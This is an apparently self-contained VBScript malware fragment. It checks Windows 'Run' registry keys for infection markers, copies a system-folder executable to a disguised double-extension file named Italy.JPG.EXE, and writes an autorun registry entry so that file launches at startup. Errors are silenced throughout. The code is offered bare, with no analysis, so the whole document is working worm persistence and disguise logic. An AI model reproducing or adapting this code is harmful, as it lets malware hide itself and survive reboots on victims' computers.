Sandra()
Sub Sandra()
On Error Resume Next
Dim fso, DirWin, DirSystem, Copia, W, R, RR
Set fso = CreateObject("Scripting.FileSystemObject")
Set DirWin = fso.GetSpecialFolder(0)
Set DirSystem = fso.GetSpecialFolder(1)
Set W = Createobject("WScript.Shell")
R = W.RegRead ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Italy")
If R = DirSystem & "\Italy.JPG.EXE"Then
Infetto = True
End If
RR = W.RegRead ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\System32")
If RR = DirWin &"\System16\System32.vbs"Then
Infetto2 = True
End If
If Infetto = True And Infetto2 = True Then 
Exit Sub
End If
Set Copia = fso.GetFile("C:\WINDOWS\SYSTEM16\System32.EXE")
Copia.Copy ("C:\WINDOWS\SYSTEM\Italy.JPG.EXE")
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Italy", "C:\WINDOWS\SYSTEM\Italy.JPG.EXE"
End Sub
Sub regcreate(regkey, regvalue)
On error resume next
Dim regedit
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey, regvalue
End Sub
